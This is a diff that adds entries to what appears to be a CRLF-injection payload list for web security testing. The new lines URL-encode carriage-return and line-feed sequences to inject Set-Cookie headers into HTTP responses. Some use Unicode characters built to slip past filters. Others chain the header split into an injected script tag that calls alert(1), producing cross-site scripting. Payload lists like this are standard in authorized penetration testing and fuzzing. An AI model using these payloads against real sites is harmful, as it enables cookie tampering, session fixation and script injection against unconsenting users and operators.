@@ -1,11 +1,27 @@
 test.com:80 
 
+%0Acrlfi:rivutest
+
+%0D%0Aset-cookie:%20RIVUDON
+
+?t=%0d%0aSet-Cookie:%20lang=n%3b
+
+%0Aset-cookie:%20hello=how
+
+嚍嚊Set-Cookie:crlfinjection=crlfinjection
+
+%E5%98%8D%E5%98%8ASet-Cookie:crlfinjection=crlfinjection
+
+嗍嗊Set-Cookie:whoami=crlfinjection嗍嗊嗍嗊嗍嗊嗍嗊嗚script嗾alert(1);嗚/script嗾
+
+%E5%98%8D%E5%98%8ASet-Cookie:whoami=crlfinjection%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert(1);%E5%98%BC/script%E5%98%BE
+
 /%0Acrlfi:rivudon
 
 /%0d%0aSet-Cookie:CRLF=RIVUDON
 /%0a%0dSet-Cookie:CRLF=RIVUDON
 
-/%0D%0Avirus:%20value
+/%0D%0Acrlf:%20injection
 
 /%%0a0aSet-Cookie:crlf=injection
 /%0aSet-Cookie:crlf=injection
